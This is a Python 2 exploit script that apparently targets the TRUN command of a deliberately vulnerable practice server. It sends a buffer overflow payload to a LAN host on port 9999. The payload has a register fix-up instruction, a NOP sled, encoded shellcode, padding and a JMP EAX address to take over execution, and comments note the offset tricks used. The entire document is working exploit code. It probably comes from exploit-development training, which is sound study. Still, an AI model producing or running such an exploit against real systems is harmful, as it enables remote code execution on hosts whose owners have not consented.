#!/usr/bin/python
import socket
import os
import sys

# Notes:
# TRUN A/.:A/   - 2 A's added   - Avoid Access Violation Issue
# 8BE1          - MOV ESP,ECX   - Fix EIP/ESP issue
# 00402D7B      - JMP EAX       - EIP overwrite

nopSled = "\x90" * 50

buf =  b""
buf += b"\xbb\xdf\xe6\x5f\xf9\xdb\xcc\xd9\x74\x24\xf4\x5a\x2b"
buf += b"\xc9\xb1\x52\x31\x5a\x12\x03\x5a\x12\x83\x1d\xe2\xbd"
buf += b"\x0c\x5d\x03\xc3\xef\x9d\xd4\xa4\x66\x78\xe5\xe4\x1d"
buf += b"\x09\x56\xd5\x56\x5f\x5b\x9e\x3b\x4b\xe8\xd2\x93\x7c"
buf += b"\x59\x58\xc2\xb3\x5a\xf1\x36\xd2\xd8\x08\x6b\x34\xe0"
buf += b"\xc2\x7e\x35\x25\x3e\x72\x67\xfe\x34\x21\x97\x8b\x01"
buf += b"\xfa\x1c\xc7\x84\x7a\xc1\x90\xa7\xab\x54\xaa\xf1\x6b"
buf += b"\x57\x7f\x8a\x25\x4f\x9c\xb7\xfc\xe4\x56\x43\xff\x2c"
buf += b"\xa7\xac\xac\x11\x07\x5f\xac\x56\xa0\x80\xdb\xae\xd2"
buf += b"\x3d\xdc\x75\xa8\x99\x69\x6d\x0a\x69\xc9\x49\xaa\xbe"
buf += b"\x8c\x1a\xa0\x0b\xda\x44\xa5\x8a\x0f\xff\xd1\x07\xae"
buf += b"\x2f\x50\x53\x95\xeb\x38\x07\xb4\xaa\xe4\xe6\xc9\xac"
buf += b"\x46\x56\x6c\xa7\x6b\x83\x1d\xea\xe3\x60\x2c\x14\xf4"
buf += b"\xee\x27\x67\xc6\xb1\x93\xef\x6a\x39\x3a\xe8\x8d\x10"
buf += b"\xfa\x66\x70\x9b\xfb\xaf\xb7\xcf\xab\xc7\x1e\x70\x20"
buf += b"\x17\x9e\xa5\xe7\x47\x30\x16\x48\x37\xf0\xc6\x20\x5d"
buf += b"\xff\x39\x50\x5e\xd5\x51\xfb\xa5\xbe\x9d\x54\xc1\x4b"
buf += b"\x76\xa7\x09\x94\x7d\x2e\xef\xbe\x91\x67\xb8\x56\x0b"
buf += b"\x22\x32\xc6\xd4\xf8\x3f\xc8\x5f\x0f\xc0\x87\x97\x7a"
buf += b"\xd2\x70\x58\x31\x88\xd7\x67\xef\xa4\xb4\xfa\x74\x34"
buf += b"\xb2\xe6\x22\x63\x93\xd9\x3a\xe1\x09\x43\x95\x17\xd0"
buf += b"\x15\xde\x93\x0f\xe6\xe1\x1a\xdd\x52\xc6\x0c\x1b\x5a"
buf += b"\x42\x78\xf3\x0d\x1c\xd6\xb5\xe7\xee\x80\x6f\x5b\xb9"
buf += b"\x44\xe9\x97\x7a\x12\xf6\xfd\x0c\xfa\x47\xa8\x48\x05"
buf += b"\x67\x3c\x5d\x7e\x95\xdc\xa2\x55\x1d\xfc\x40\x7f\x68"
buf += b"\x95\xdc\xea\xd1\xf8\xde\xc1\x16\x05\x5d\xe3\xe6\xf2"
buf += b"\x7d\x86\xe3\xbf\x39\x7b\x9e\xd0\xaf\x7b\x0d\xd0\xe5"

switchReg = "\x8B\xE1"

crash = switchReg + nopSled + buf + "C" * (2001 - len(switchReg) - len(nopSled) - len(buf)) + "\x1C\x10\x40" + "\x00" # 0040101C - JMP EAX - we drop the last EIP NULL byte

buffer="TRUN A/.:A/"
buffer+= crash + "\r\n"
print "[*] Sending exploit!"

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.100.120", 9999))
expl.send(buffer)
expl.close()

